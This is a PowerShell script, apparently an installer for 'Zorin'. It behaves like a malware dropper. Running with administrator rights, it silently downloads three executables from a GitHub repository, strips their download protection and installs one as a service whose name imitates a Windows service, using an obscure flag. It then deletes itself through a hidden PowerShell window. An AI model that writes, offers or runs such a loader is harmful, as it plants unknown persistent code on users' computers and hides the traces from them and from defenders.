#Requires -RunAsAdministrator

$ErrorActionPreference = "Stop"

try {
    $installPath = "$env:ProgramFiles\Zorin"
    if (Test-Path $installPath) {
        Remove-Item -Path $installPath -Recurse -Force
    }
    New-Item -Path $installPath -ItemType Directory -Force | Out-Null

    $url1 = "https://github.com/xytophe/zorin/raw/refs/heads/main/Zorin(R)%20LOGSE.exe"
    $url2 = "https://github.com/xytophe/zorin/raw/refs/heads/main/LogsCap.exe"
    $urlService = "https://github.com/xytophe/zorin/raw/refs/heads/main/WpnAudService.exe"
    
    Invoke-WebRequest -Uri $url1 -OutFile "$installPath\Zorin(R) LOGSE.exe" -UseBasicParsing | Out-Null
    Invoke-WebRequest -Uri $url2 -OutFile "$installPath\LogsCap.exe" -UseBasicParsing | Out-Null
    Invoke-WebRequest -Uri $urlService -OutFile "$installPath\WpnAudService.exe" -UseBasicParsing | Out-Null
    
    Unblock-File -Path "$installPath\Zorin(R) LOGSE.exe"
    Unblock-File -Path "$installPath\LogsCap.exe"
    Unblock-File -Path "$installPath\WpnAudService.exe"

    $existingService = Get-Service -Name "WpnAudService" -ErrorAction SilentlyContinue
    if ($existingService) {
        & "$installPath\WpnAudService.exe" --IrXgDIpcabef6VgRZqMAjujhRXT 2>&1 | Out-Null
        Start-Sleep -Seconds 2
    }
    
    & "$installPath\WpnAudService.exe" --install 2>&1 | Out-Null
    Start-Sleep -Seconds 2

} catch {
    exit 1
}

$scriptPath = $MyInvocation.MyCommand.Path
$deleteCommand = "Start-Sleep -Seconds 3; Remove-Item -LiteralPath '$scriptPath' -Force -ErrorAction SilentlyContinue"
Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Hidden", "-Command", $deleteCommand -WindowStyle Hidden
exit 0